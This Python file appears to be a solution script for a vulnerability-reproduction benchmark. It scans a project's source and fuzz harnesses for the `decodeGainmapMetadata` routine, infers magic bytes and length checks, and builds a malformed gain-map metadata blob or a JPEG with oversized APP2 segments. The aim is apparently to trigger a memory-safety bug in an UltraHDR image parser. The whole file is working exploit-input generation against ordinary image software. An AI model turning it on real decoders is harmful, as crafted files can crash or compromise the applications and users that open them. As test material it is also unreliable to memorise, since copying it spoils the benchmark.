import os
import re
import tarfile
import zipfile
from typing import Dict, List, Optional, Tuple


class Solution:
    def _iter_source_files_from_dir(self, root: str) -> List[Tuple[str, bytes]]:
        out: List[Tuple[str, bytes]] = []
        for base, _, files in os.walk(root):
            for fn in files:
                p = os.path.join(base, fn)
                rel = os.path.relpath(p, root)
                try:
                    with open(p, "rb") as f:
                        out.append((rel, f.read()))
                except Exception:
                    continue
        return out

    def _iter_source_files(self, src_path: str) -> List[Tuple[str, bytes]]:
        if os.path.isdir(src_path):
            return self._iter_source_files_from_dir(src_path)

        if tarfile.is_tarfile(src_path):
            out: List[Tuple[str, bytes]] = []
            with tarfile.open(src_path, "r:*") as tf:
                for m in tf.getmembers():
                    if not m.isfile():
                        continue
                    name = m.name
                    if len(name) > 4096:
                        continue
                    try:
                        f = tf.extractfile(m)
                        if f is None:
                            continue
                        data = f.read()
                        out.append((name, data))
                    except Exception:
                        continue
            return out

        if zipfile.is_zipfile(src_path):
            out = []
            with zipfile.ZipFile(src_path, "r") as zf:
                for name in zf.namelist():
                    if name.endswith("/"):
                        continue
                    try:
                        out.append((name, zf.read(name)))
                    except Exception:
                        continue
            return out

        try:
            with open(src_path, "rb") as f:
                return [(os.path.basename(src_path), f.read())]
        except Exception:
            return []

    def _to_text(self, b: bytes) -> str:
        try:
            return b.decode("utf-8", errors="ignore")
        except Exception:
            try:
                return b.decode("latin-1", errors="ignore")
            except Exception:
                return ""

    def _collect_text_sources(self, files: List[Tuple[str, bytes]]) -> List[Tuple[str, str]]:
        exts = (
            ".c",
            ".cc",
            ".cpp",
            ".cxx",
            ".h",
            ".hh",
            ".hpp",
            ".hxx",
            ".inc",
            ".inl",
            ".m",
            ".mm",
            ".java",
            ".rs",
        )
        out: List[Tuple[str, str]] = []
        for name, data in files:
            lname = name.lower()
            if any(lname.endswith(e) for e in exts) or "fuzz" in lname or "fuzzer" in lname:
                if len(data) > 2_000_000:
                    data = data[:2_000_000]
                out.append((name, self._to_text(data)))
        return out

    def _find_fuzzer_sources(self, texts: List[Tuple[str, str]]) -> List[Tuple[str, str]]:
        out: List[Tuple[str, str]] = []
        for name, txt in texts:
            if "LLVMFuzzerTestOneInput" in txt:
                out.append((name, txt))
        return out

    def _select_mode(self, fuzzer_texts: List[Tuple[str, str]], all_text_concat: str) -> str:
        for _, txt in fuzzer_texts:
            if re.search(r"\bdecodeGainmapMetadata\s*\(\s*(?:Data|data)\s*,\s*(?:Size|size)\b", txt):
                return "raw"
            if re.search(r"\bdecodeGainmapMetadata\s*\(\s*(?:data|Data)\s*,\s*(?:size|Size)\s*,", txt):
                return "raw"

        jpeg_score = 0
        for _, txt in fuzzer_texts:
            t = txt.lower()
            if "jpeg" in t or "jpg" in t:
                jpeg_score += 2
            if "0xffd8" in t or "ffd8" in t or "soi" in t:
                jpeg_score += 1
            if "app2" in t or "app1" in t:
                jpeg_score += 1
            if "ultrahdr" in t or "uhdr" in t or "jpegr" in t:
                jpeg_score += 2

        t_all = all_text_concat.lower()
        if jpeg_score >= 2:
            return "jpeg"
        if "decodegainmapmetadata" in t_all and ("jpeg" in t_all or "app2" in t_all or "jpegr" in t_all or "ultrahdr" in t_all):
            return "jpeg"
        return "raw"

    def _extract_function_body(self, txt: str, func_name: str) -> Optional[str]:
        idx = txt.find(func_name)
        if idx < 0:
            return None
        start = txt.rfind("\n", 0, idx)
        if start < 0:
            start = 0
        brace = txt.find("{", idx)
        if brace < 0:
            return None
        i = brace
        depth = 0
        n = len(txt)
        while i < n:
            c = txt[i]
            if c == "{":
                depth += 1
            elif c == "}":
                depth -= 1
                if depth == 0:
                    return txt[brace : i + 1]
            i += 1
        return None

    def _parse_int_literal(self, s: str) -> Optional[int]:
        s = s.strip()
        if not s:
            return None
        s = re.sub(r"[uUlLzZ]+$", "", s)
        try:
            if s.startswith(("0x", "0X")):
                return int(s, 16)
            if s.startswith(("0b", "0B")):
                return int(s, 2)
            if s.startswith(("0o", "0O")):
                return int(s, 8)
            if re.fullmatch(r"-?\d+", s):
                return int(s, 10)
        except Exception:
            return None
        return None

    def _collect_constants(self, texts: List[Tuple[str, str]]) -> Dict[str, int]:
        consts: Dict[str, int] = {}
        pat_define = re.compile(r"^[ \t]*#define[ \t]+([A-Za-z_]\w*)[ \t]+(\(?\s*(?:0x[0-9A-Fa-f]+|\d+)\s*\)?)", re.M)
        pat_const = re.compile(
            r"\b(?:const|constexpr)\s+(?:unsigned\s+)?(?:int|long|size_t|uint32_t|uint64_t|uint16_t|uint8_t)\s+([A-Za-z_]\w*)\s*=\s*([^;]+);"
        )
        pat_enum = re.compile(r"\b([A-Za-z_]\w*)\s*=\s*(0x[0-9A-Fa-f]+|\d+)\b")
        for _, txt in texts:
            for m in pat_define.finditer(txt):
                name = m.group(1)
                val_s = m.group(2).strip()
                val_s = val_s.strip("() \t")
                val = self._parse_int_literal(val_s)
                if val is not None and name not in consts:
                    consts[name] = val
            for m in pat_const.finditer(txt):
                name = m.group(1)
                expr = m.group(2).strip()
                expr = expr.split()[0]
                val = self._parse_int_literal(expr)
                if val is not None and name not in consts:
                    consts[name] = val
            if "enum" in txt:
                for m in pat_enum.finditer(txt):
                    name = m.group(1)
                    val = self._parse_int_literal(m.group(2))
                    if val is not None and name not in consts:
                        consts[name] = val
        return consts

    def _detect_magic_prefix_from_body(self, body: str) -> bytes:
        if not body:
            return b""
        magic_candidates: List[Tuple[int, bytes]] = []

        for m in re.finditer(r"memcmp\s*\(\s*([^\),]+)\s*,\s*\"((?:\\.|[^\"\\])*)\"\s*,\s*(\d+)\s*\)\s*==\s*0", body):
            arg0 = m.group(1)
            s = m.group(2)
            n = int(m.group(3))
            if "data" in arg0 and "+" not in arg0 and "[" not in arg0 and n > 0 and n <= 32:
                try:
                    bs = bytes(s, "utf-8").decode("unicode_escape").encode("latin-1", errors="ignore")
                except Exception:
                    bs = s.encode("latin-1", errors="ignore")
                magic_candidates.append((n, bs[:n]))

        for m in re.finditer(r"strncmp\s*\(\s*([^\),]+)\s*,\s*\"((?:\\.|[^\"\\])*)\"\s*,\s*(\d+)\s*\)\s*==\s*0", body):
            arg0 = m.group(1)
            s = m.group(2)
            n = int(m.group(3))
            if "data" in arg0 and "+" not in arg0 and "[" not in arg0 and n > 0 and n <= 32:
                try:
                    bs = bytes(s, "utf-8").decode("unicode_escape").encode("latin-1", errors="ignore")
                except Exception:
                    bs = s.encode("latin-1", errors="ignore")
                magic_candidates.append((n, bs[:n]))

        if not magic_candidates:
            return b""
        magic_candidates.sort(key=lambda x: (-x[0], x[1]))
        return magic_candidates[0][1]

    def _detect_size_params(self, signature_line: str) -> List[str]:
        params = []
        inside = signature_line
        m = re.search(r"decodeGainmapMetadata\s*\((.*)\)", inside)
        if not m:
            return params
        plist = m.group(1)
        parts = [p.strip() for p in plist.split(",")]
        for p in parts:
            if not p:
                continue
            if "size_t" in p or "uint32_t" in p or "uint64_t" in p or "int" in p:
                tokens = re.findall(r"[A-Za-z_]\w*", p)
                if tokens:
                    params.append(tokens[-1])
        return params

    def _detect_offset_candidate(self, body: str, size_param_names: List[str], consts: Dict[str, int]) -> Optional[int]:
        if not body:
            return None
        size_vars = [n for n in size_param_names if "size" in n.lower() or "len" in n.lower() or "length" in n.lower()]
        if not size_vars and size_param_names:
            size_vars = size_param_names[:1]
        if not size_vars:
            size_vars = ["size", "len", "length", "dataSize", "data_size", "buf_size"]

        candidates: List[int] = []

        for sv in size_vars:
            for m in re.finditer(r"if\s*\(\s*" + re.escape(sv) + r"\s*-\s*([A-Za-z_]\w*|\d+)\s*<", body):
                rhs = m.group(1)
                val = self._parse_int_literal(rhs)
                if val is None:
                    val = consts.get(rhs)
                if val is not None and 0 < val <= 4096:
                    candidates.append(val)

            for m in re.finditer(r"\b" + re.escape(sv) + r"\s*-\s*(\d+)\b", body):
                val = self._parse_int_literal(m.group(1))
                if val is not None and 0 < val <= 4096:
                    candidates.append(val)

        if not candidates:
            for m in re.finditer(r"\bsize\s*-\s*(\d+)\b", body):
                val = self._parse_int_literal(m.group(1))
                if val is not None and 0 < val <= 4096:
                    candidates.append(val)

        if not candidates:
            return None
        return max(candidates)

    def _detect_min_required(self, body: str, size_param_names: List[str], consts: Dict[str, int]) -> int:
        if not body:
            return 0
        size_vars = [n for n in size_param_names if "size" in n.lower() or "len" in n.lower() or "length" in n.lower()]
        if not size_vars and size_param_names:
            size_vars = size_param_names[:1]
        if not size_vars:
            size_vars = ["size", "len", "length", "dataSize", "data_size", "buf_size"]

        min_req = 0
        for sv in size_vars:
            for m in re.finditer(r"if\s*\(\s*" + re.escape(sv) + r"\s*<\s*([A-Za-z_]\w*|\d+)\s*\)", body):
                rhs = m.group(1)
                val = self._parse_int_literal(rhs)
                if val is None:
                    val = consts.get(rhs)
                if val is not None and 0 <= val <= 4096:
                    min_req = max(min_req, val)
            for m in re.finditer(r"if\s*\(\s*" + re.escape(sv) + r"\s*<=\s*([A-Za-z_]\w*|\d+)\s*\)", body):
                rhs = m.group(1)
                val = self._parse_int_literal(rhs)
                if val is None:
                    val = consts.get(rhs)
                if val is not None and 0 <= val <= 4096:
                    min_req = max(min_req, val + 1)
        return min_req

    def _detect_identifiers(self, all_text_concat: str) -> List[bytes]:
        s = all_text_concat
        candidates = []
        for pat in [
            "HDRGM",
            "UHDR",
            "JPEGR",
            "GAINMAP",
            "GainMap",
            "gainmap",
            "HDRGainMap",
            "hdr-gain-map",
            "GContainer",
            "gcontainer",
            "GainMapMetadata",
            "gainmapmetadata",
        ]:
            if pat in s:
                candidates.append(pat)

        upper_fourcc = set(re.findall(r"\"([A-Z0-9]{4,8})\"", s))
        for x in upper_fourcc:
            if "HDR" in x or "GM" in x or "UHDR" in x or "JPG" in x or "JPE" in x:
                candidates.append(x)

        uniq: List[str] = []
        seen = set()
        for c in candidates:
            if c not in seen:
                seen.add(c)
                uniq.append(c)

        out: List[bytes] = []
        for u in uniq:
            try:
                out.append(u.encode("ascii", errors="ignore"))
            except Exception:
                continue

        if not out:
            out = [b"HDRGM", b"UHDR", b"JPEGR"]

        return out[:5]

    def _make_metadata(self, meta_len: int, magic: bytes) -> bytes:
        if meta_len < 0:
            meta_len = 0
        buf = bytearray(b"\x00" * meta_len)
        if magic:
            buf[: min(len(magic), meta_len)] = magic[: min(len(magic), meta_len)]
            base = len(magic)
        else:
            base = 0

        for off in [base, base + 1, base + 2, base + 3]:
            if 0 <= off < meta_len:
                buf[off] = 1

        safe_prefix = min(meta_len, max(16, base + 8))
        for i in range(safe_prefix, meta_len):
            buf[i] = 0xFF

        for off in [16, 20, 24, 28, 32, 36, 40, 44, 48, 52, 56, 60]:
            if off + 4 <= meta_len and off >= safe_prefix:
                buf[off : off + 4] = b"\xFF\xFF\xFF\xFF"

        if meta_len >= 8:
            buf[meta_len - 4 : meta_len] = b"\xFF\xFF\xFF\xFF"

        return bytes(buf)

    def _jpeg_app(self, marker: int, payload: bytes) -> bytes:
        if not (0xE0 <= marker <= 0xEF):
            marker = 0xE2
        ln = len(payload) + 2
        if ln > 0xFFFF:
            payload = payload[: 0xFFFF - 2]
            ln = len(payload) + 2
        return b"\xFF" + bytes([marker]) + ln.to_bytes(2, "big") + payload

    def _make_jpeg(self, segments: List[bytes]) -> bytes:
        return b"\xFF\xD8" + b"".join(segments) + b"\xFF\xD9"

    def solve(self, src_path: str) -> bytes:
        files = self._iter_source_files(src_path)
        texts = self._collect_text_sources(files)
        all_text_concat = "\n".join(txt for _, txt in texts)

        fuzzers = self._find_fuzzer_sources(texts)
        mode = self._select_mode(fuzzers, all_text_concat)

        consts = self._collect_constants(texts)

        decode_file_txt = ""
        decode_body = None
        for name, txt in texts:
            if "decodeGainmapMetadata" in txt:
                decode_file_txt = txt
                decode_body = self._extract_function_body(txt, "decodeGainmapMetadata")
                if decode_body:
                    break

        signature_line = ""
        if decode_file_txt:
            m = re.search(r"decodeGainmapMetadata\s*\([^)]*\)", decode_file_txt)
            if m:
                signature_line = m.group(0)

        size_param_names = self._detect_size_params(signature_line) if signature_line else []
        magic = self._detect_magic_prefix_from_body(decode_body or "")

        offset_cand = self._detect_offset_candidate(decode_body or "", size_param_names, consts)
        min_req = self._detect_min_required(decode_body or "", size_param_names, consts)

        identifiers = self._detect_identifiers(all_text_concat)

        if mode == "raw":
            target_len = 133
            if offset_cand is not None and 0 < offset_cand <= 2048:
                target_len = min(target_len, max(min_req, offset_cand - 1))
                if target_len < min_req:
                    target_len = min_req
            else:
                target_len = max(min_req, target_len)
            if target_len <= 0:
                target_len = 32
            return self._make_metadata(target_len, magic)

        id_main = identifiers[0] if identifiers else b"HDRGM"
        id_is_urlish = b":" in id_main or b"/" in id_main or id_main.lower().startswith(b"http")
        id_is_upper_short = len(id_main) <= 8 and all(65 <= c <= 90 or 48 <= c <= 57 for c in id_main)
        id_payload = id_main + (b"" if id_is_upper_short else (b"\x00" if id_is_urlish or True else b""))

        total_target = 133
        payload_len_target = max(8, total_target - 8)
        meta_len = max(16, payload_len_target - len(id_payload))

        if offset_cand is not None and 0 < offset_cand <= 2048:
            meta_len = min(meta_len, max(min_req, offset_cand - 1))
            if meta_len < min_req:
                meta_len = min_req
        else:
            meta_len = max(meta_len, min_req)

        if meta_len < 16:
            meta_len = 16

        meta = self._make_metadata(meta_len, magic)

        segs = []
        segs.append(self._jpeg_app(0xE2, id_payload + meta))

        if len(identifiers) > 1 and len(segs) == 1:
            alt = identifiers[1]
            alt_is_urlish = b":" in alt or b"/" in alt or alt.lower().startswith(b"http")
            alt_is_upper_short = len(alt) <= 8 and all(65 <= c <= 90 or 48 <= c <= 57 for c in alt)
            alt_payload = alt + (b"" if alt_is_upper_short else (b"\x00" if alt_is_urlish or True else b""))
            alt_meta = self._make_metadata(min(64, meta_len), magic)
            segs.append(self._jpeg_app(0xE2, alt_payload + alt_meta))

        return self._make_jpeg(segs)